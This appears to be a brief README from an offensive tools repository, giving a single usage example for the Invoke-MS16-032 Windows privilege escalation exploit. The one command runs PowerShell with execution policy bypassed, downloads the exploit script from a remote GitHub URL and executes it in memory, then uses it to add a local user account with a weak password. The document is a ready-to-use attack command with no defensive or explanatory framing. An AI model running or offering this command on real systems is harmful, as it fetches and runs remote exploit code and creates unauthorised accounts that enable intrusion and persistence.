# Tools

# Invoke-MS16-032 
## Create Account Example:
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DannyChen2023/Tools/main/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user test test /add'"
